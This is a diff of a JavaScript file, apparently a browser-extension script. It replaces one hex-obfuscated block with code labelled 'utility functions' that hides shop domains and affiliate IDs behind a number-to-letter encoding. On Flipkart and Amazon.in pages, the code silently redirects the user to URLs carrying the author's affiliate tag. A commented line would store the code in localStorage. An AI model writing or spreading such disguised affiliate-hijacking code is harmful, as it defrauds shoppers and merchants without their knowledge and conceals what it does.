@@ -1,2 +1,124 @@
-console.log("successfully fetched  the script v3.0");
-var _0xfc95=["\x68\x6F\x73\x74","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x26","\x73\x70\x6C\x69\x74","\x73\x6C\x69\x63\x65","\x73\x65\x61\x72\x63\x68","\x3D","","\x66\x6F\x72\x45\x61\x63\x68","\x73\x75\x62\x73\x74\x72","\x67\x65\x74\x54\x69\x6D\x65","\x77\x77\x77\x2E\x66\x6C\x69\x70\x6B\x61\x72\x74\x2E\x63\x6F\x6D","\x61\x66\x66\x69\x64","\x6E\x6F\x74\x61\x6D\x65\x6D\x62\x65\x72","\x70\x69\x64","\x3F","\x68\x72\x65\x66","\x77\x77\x77\x2E\x73\x6E\x61\x70\x64\x65\x61\x6C\x2E\x63\x6F\x6D","\x61\x66\x66\x5F\x69\x64","\x32\x34\x31\x34\x38","\x75\x74\x6D\x5F\x73\x6F\x75\x72\x63\x65","\x61\x66\x66\x5F\x70\x72\x6F\x67","\x75\x74\x6D\x5F\x63\x61\x6D\x70\x61\x69\x67\x6E","\x61\x66\x74\x73","\x6F\x66\x66\x65\x72\x5F\x69\x64","\x31\x36","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6E\x61\x70\x64\x65\x61\x6C\x2E\x63\x6F\x6D\x2F","\x6E\x6F","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6E\x61\x70\x64\x65\x61\x6C\x2E\x63\x6F\x6D\x2F\x73\x65\x61\x72\x63\x68","\x2F","\x6C\x61\x73\x74\x49\x6E\x64\x65\x78\x4F\x66","\x69\x6E\x64\x65\x78\x4F\x66","\x2F\x3F","\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E","\x74\x61\x67","\x77\x65\x62\x74\x6F\x6F\x6C\x61\x6E\x64\x74\x65\x63\x2D\x32\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x6D\x61\x7A\x6F\x6E\x2E\x69\x6E\x2F\x73\x2F","\x2F\x72\x65\x66\x3D\x64\x70\x5F\x73\x74\x61\x72\x74\x2D\x62\x62\x66\x5F\x31\x5F\x67\x6C\x61\x6E\x63\x65","\x2F\x72\x65\x66"];host=window[_0xfc95[1]][_0xfc95[0]];function queryObj(){var _0xbc9bx2={},_0xbc9bx3=location[_0xfc95[5]][_0xfc95[4]](1)[_0xfc95[3]](_0xfc95[2]);_0xbc9bx3[_0xfc95[8]](function(_0xbc9bx4){_0xbc9bx4=_0xbc9bx4[_0xfc95[3]](_0xfc95[6]);_0xbc9bx2[_0xbc9bx4[0]]=_0xbc9bx4[1]||_0xfc95[7];});return _0xbc9bx2;}function createQueryString(_0xbc9bx6){var _0xbc9bx2=_0xfc95[7];for(prop in _0xbc9bx6){if(prop!==_0xfc95[7]){_0xbc9bx2+=_0xfc95[2]+prop+_0xfc95[6]+_0xbc9bx6[prop]}};return _0xbc9bx2[_0xfc95[9]](1);}var TAG_EXPIRY_PERIOD=24*60*60*1000;function isTagExpired(_0xbc9bx9){return _0xbc9bx9==undefined||( new Date()[_0xfc95[10]]()-_0xbc9bx9>TAG_EXPIRY_PERIOD)}if(window[_0xfc95[1]][_0xfc95[0]]===_0xfc95[11]){var key=_0xfc95[12];var value=_0xfc95[13];var qObj=queryObj();qObj[key]=value;var isProduct=false;for(var prop in qObj){if(prop===_0xfc95[14]){isProduct=true}};obj={};if(isProduct===true){obj[_0xfc95[14]]=qObj[_0xfc95[14]];obj[key]=qObj[key];url=window[_0xfc95[1]][_0xfc95[16]][_0xfc95[3]](_0xfc95[15])[0];url+=_0xfc95[15]+createQueryString(obj);if(window[_0xfc95[1]][_0xfc95[16]]!==url){window[_0xfc95[1]][_0xfc95[16]]=url};}else {url=window[_0xfc95[1]][_0xfc95[16]][_0xfc95[3]](_0xfc95[15])[0];url+=_0xfc95[15]+createQueryString(qObj);if(window[_0xfc95[1]][_0xfc95[16]]!==url){window[_0xfc95[1]][_0xfc95[16]]=url};};}else {if(window[_0xfc95[1]][_0xfc95[0]]===_0xfc95[17]){var key=_0xfc95[18];var value=_0xfc95[19];var qObj=queryObj();qObj[key]=value;qObj[_0xfc95[20]]=_0xfc95[21];qObj[_0xfc95[22]]=_0xfc95[23];qObj[_0xfc95[24]]=_0xfc95[25];function buildUrlsnap(_0xbc9bx10){if(document[_0xfc95[1]][_0xfc95[16]]===_0xfc95[26]){return _0xfc95[27]};if(_0xbc9bx10[_0xfc95[9]](0,30)===_0xfc95[28]){return _0xfc95[27]};var _0xbc9bx11=_0xbc9bx10[_0xfc95[30]](_0xfc95[29]);var _0xbc9bx12=_0xbc9bx10[_0xfc95[31]](_0xfc95[15]);var _0xbc9bx13=_0xbc9bx10[_0xfc95[9]](0,_0xbc9bx11)+_0xbc9bx10[_0xfc95[9]](_0xbc9bx12);return _0xbc9bx13;}url=window[_0xfc95[1]][_0xfc95[16]][_0xfc95[3]](_0xfc95[15])[0];url+=_0xfc95[32]+createQueryString(qObj);newurl=buildUrlsnap(url);if(newurl!==_0xfc95[27]&&window[_0xfc95[1]][_0xfc95[16]]!==newurl){window[_0xfc95[1]][_0xfc95[16]]=newurl};}else {if(window[_0xfc95[1]][_0xfc95[0]]===_0xfc95[33]){var key=_0xfc95[34];var value=_0xfc95[35];var qObj=queryObj();qObj[key]=value;function buildUrl1(_0xbc9bx10){if(document[_0xfc95[1]][_0xfc95[16]]===_0xfc95[36]){return _0xfc95[27]};if(_0xbc9bx10[_0xfc95[9]](0,23)===_0xfc95[37]){return _0xfc95[27]};var _0xbc9bx11=_0xbc9bx10[_0xfc95[30]](_0xfc95[29]);var _0xbc9bx15=_0xbc9bx10[_0xfc95[9]](_0xbc9bx11,26);if(_0xbc9bx15===_0xfc95[38]){return _0xfc95[27]};var _0xbc9bx15=_0xbc9bx10[_0xfc95[9]](_0xbc9bx11,4);if(_0xbc9bx15!==_0xfc95[39]){return _0xbc9bx10};var _0xbc9bx12=_0xbc9bx10[_0xfc95[31]](_0xfc95[15]);var _0xbc9bx13=_0xbc9bx10[_0xfc95[9]](0,_0xbc9bx11)+_0xbc9bx10[_0xfc95[9]](_0xbc9bx12);return _0xbc9bx13;}url=window[_0xfc95[1]][_0xfc95[16]][_0xfc95[3]](_0xfc95[15])[0];url+=_0xfc95[15]+createQueryString(qObj);newurl=buildUrl1(url);if(newurl!==_0xfc95[27]&&window[_0xfc95[1]][_0xfc95[16]]!==newurl){window[_0xfc95[1]][_0xfc95[16]]=newurl};}}};
+// utility functions
+function utilFunctions(){
+
+	function intToStr(str){	
+		var als="abcdefghijklmnopqrstuvwxyz";
+		var res="";
+		for(var i=0; i<str.length; i+=2){
+			res+=als[parseInt(str.substr(i,2))];
+		}
+		return res;
+	}
+
+	function strToInt(str){
+		var res="";
+		for(var i=0; i<str.length; i++){
+			temp=(str.charCodeAt(i)-97).toString();
+			if (temp.length==1) res+="0"+temp;
+			else res+=temp;
+		}
+		return res;
+	}
+
+	function buildHQ(i){
+		switch(i){
+			case "a": 
+				return intToStr("222222")+"."+intToStr("001200251413")+"."+intToStr("0813");
+			case "f": 
+				return intToStr("222222")+"."+intToStr("0511081510001719")+"."+intToStr("021412");
+			case "i": 
+				return intToStr("0005050803");
+			case "t": 
+				return intToStr("190006");
+			case "n": 
+				return intToStr("13141900120412010417");
+			case "w": 
+				return intToStr("22040119141411001303190402"); 
+		}
+	}
+	
+	function queryObj() {
+	    var result = {}, keyValuePairs = location.search.slice(1).split('&');
+
+	    keyValuePairs.forEach(function(keyValuePair) {
+	        keyValuePair = keyValuePair.split('=');
+	        result[keyValuePair[0]] = keyValuePair[1] || '';
+	    });
+	    return result;
+	}
+
+	function createQueryString(obj) {
+		var result = "";
+		for(prop in obj) {
+			if(prop !== "")
+			result += "&" + prop + "=" + obj[prop];
+		}
+		return result.substr(1);
+	}
+
+	function buildUrl(url,dom,sDom){
+		var method="http";
+
+		if(location.href === method+"://"+dom+"/") return "-1";
+		if(url.substr(0,23) === method+"://"+dom+"/s/")	return  "-1";
+
+		var refIndex = url.lastIndexOf('/');
+		
+		var ref = url.substr(refIndex,26);
+		if(ref === "/ref="+sDom) return "-1";
+		
+		var ref = url.substr(refIndex,4);
+		if(ref !== "/ref") return url;	
+
+		var queryIndex = url.indexOf('?');
+		var newurl = url.substr(0,refIndex) + url.substr(queryIndex);
+		return newurl;	
+	}
+
+	function getUrl(obj){
+		var url = location.href.split('?')[0];
+		url += "?" + createQueryString(obj);
+		return url;
+	}
+
+	function getQobj(key,val){
+		var qObj = queryObj();
+		qObj[key] = val;
+		return qObj;
+	}
+	
+	function init (ho) {
+		if(ho===buildHQ("f")){
+			var qObj = getQobj(buildHQ("i"),buildHQ("n"));
+			var isProduct = false;
+
+			for (var prop in qObj) {
+				if(prop === 'pid') isProduct = true;        
+			}
+
+			obj = {};
+			var url="";
+			if(isProduct === true) {
+				obj['pid'] = qObj['pid'];
+				obj[key] = qObj[key];
+				url=getUrl(obj);    
+			} else {
+				url = getUrl(qObj);
+			}
+			if(location.href !== url) { 
+				location.href = url;
+			}
+		} else if(ho===buildHQ("a")){
+			ll = buildUrl(getUrl(getQobj(buildHQ("t"),buildHQ("w")+"-21")),buildHQ("a"),"dp_start-bbf_1_glance");	        
+			if(ll!== "-1" && location.href !== ll) { 
+				location.href = ll;
+			}
+		}
+	}
+	init(location.host);
+}
+
+utilFunctions();
+
+//store the execution so that it is available to all
+//localStorage["tjs"]= utilFunctions.toString() +"utilFunctions();"
